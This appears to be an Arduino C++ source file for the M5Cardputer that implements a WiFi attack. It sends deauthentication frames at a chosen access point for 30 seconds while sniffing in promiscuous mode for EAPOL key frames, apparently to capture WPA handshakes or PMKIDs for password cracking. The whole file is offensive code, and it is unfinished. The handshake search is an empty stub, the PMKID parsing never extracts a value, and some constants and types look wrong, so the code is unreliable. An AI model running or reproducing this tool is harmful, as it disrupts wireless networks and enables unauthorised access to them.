#include <Arduino.h>
#include <M5Cardputer.h>
#include <esp_system.h>
#include <esp_wifi.h>
#include "wifi/BruteForceTypes.h"



extern wifi_ap_record_t accessPointInfo;
uint8_t searchType = 0;



void bruteForceAttack(uint8_t attackType);
void wifiSniffer(void *buf, wifi_promiscuous_pkt_type_t type);
void searchForHandshake();
void searchForPMKID(eapol_key_packet_t *eapolKeyPacket);



void bruteForceAttack(uint8_t attackType) {
    searchType = attackType;
    esp_wifi_set_channel(accessPointInfo.primary, WIFI_SECOND_CHAN_NONE);
    wifi_promiscuous_filter_t filter = { .filter_mask = 0 };
    filter.filter_mask |= WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&wifiSniffer);

    u64_t startTime = millis();
    while (millis() - startTime < 30000) {
        deauthAttack();
        delay(10);
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
}



void wifiSniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *dataFrame = (wifi_promiscuous_pkt_t *)buf;
    data_frame_mac_header_t *macHeader = (data_frame_mac_header_t *)dataFrame->payload;
    if (memcmp(macHeader->address3, accessPointInfo.bssid, 6) != 0) { return; }

    data_frame_t *parsedDataFrame = (data_frame_t *)dataFrame->payload;
    uint8_t *dataFrameBuffer = parsedDataFrame->body;
    if (macHeader->frame_control.protected_frame == 1) { return; }
    if (macHeader->frame_control.subtype > 7) { dataFrameBuffer += 2; }

    dataFrameBuffer += sizeof(llc_snap_header_t);
    if (ntohs(*(uint16_t *) dataFrameBuffer) != 0x888E) { return; }
    dataFrameBuffer += 2;

    eapol_packet_t *eapolPacket = (eapol_packet_t *) dataFrameBuffer;
    if (eapolPacket->header.packet_type != EAPOL_KEY) { return; }

    eapol_key_packet_t *eapolKeyPacket = (eapol_key_packet_t *) eapolPacket->packet_body;
    if (searchType == 0) {
        searchForHandshake();
    } else {
        M5Cardputer.Display.clear();
        M5Cardputer.Display.setCursor(0, 0);
        searchForPMKID(eapolKeyPacket);
    }
}



void searchForHandshake() {
}



void searchForPMKID(eapol_key_packet_t *eapolKeyPacket) {
    if (eapolKeyPacket->key_data_length == 0) { return; }
    if (eapolKeyPacket->key_information.encrypted_key_data == 1) { return; }

    uint8_t *keyData = eapolKeyPacket->key_data;
    uint8_t *keyDataIndex = keyData;
    uint8_t *keyDataMaxIndex = keyData + ntohs(eapolKeyPacket->key_data_length);

    pmkid_item_t *pmkidItemHead = NULL;
    key_data_field_t *keyDataField;
    do {
        keyDataField = (key_data_field_t *) keyDataIndex;
        keyDataIndex = keyDataField->data + keyDataField->length - 4 + 1;

        M5Cardputer.Display.println(keyDataField->type);
        delay(400);
        if (keyDataField->type != 0xDD) { continue; }
        if (ntohl(keyDataField->oui) != 0x00FAC00) { continue; }
        if (keyDataField->data_type != 4) { continue; }

    } while (keyDataIndex < keyDataMaxIndex);
}